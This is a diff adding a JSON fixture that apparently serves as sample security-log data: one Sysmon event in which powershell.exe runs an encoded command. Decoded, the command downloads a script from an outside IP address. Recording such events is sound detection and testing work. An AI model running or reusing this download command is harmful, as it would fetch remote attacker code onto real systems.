@@ -1,0 +1,11 @@
+[
+  {
+    "source": "sysmon",
+    "timestamp": "2026-07-19T10:00:00Z",
+    "host": "WORKSTATION-07",
+    "user": "john.doe",
+    "process": "powershell.exe",
+    "command_line": "powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaHR0cDovLzE4NS40NC45LjE5ODovcHMucHMxJyAp",
+    "destination_ip": "185.44.9.198"
+  }
+]
